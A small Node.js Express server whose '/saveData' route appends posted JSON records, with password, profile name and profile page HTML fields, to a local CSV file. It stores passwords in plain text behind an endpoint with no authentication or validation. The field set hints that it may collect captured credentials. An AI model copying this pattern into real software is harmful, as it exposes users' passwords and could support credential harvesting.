const express = require('express');
const bodyParser = require('body-parser');
const createCsvWriter = require('csv-writer').createObjectCsvWriter;

const app = express();
app.use(bodyParser.json());

// Define a route to handle POST requests from the frontend
app.post('/saveData', (req, res) => {
  const data = req.body;

  // Write data to CSV file
  const csvWriter = createCsvWriter({
    path: 'data.csv',
    header: [
      { id: 'password', title: 'Password' },
      { id: 'profileName', title: 'Profile Name' },
      { id: 'profilePageHtml', title: 'Profile Page HTML' }
    ],
    append: true
  });

  csvWriter.writeRecords([data])
    .then(() => {
      console.log('Data has been written to the CSV file');
      res.sendStatus(200);
    })
    .catch((error) => {
      console.error('Error writing to CSV file: ', error);
      res.status(500).send('Internal Server Error');
    });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});

      
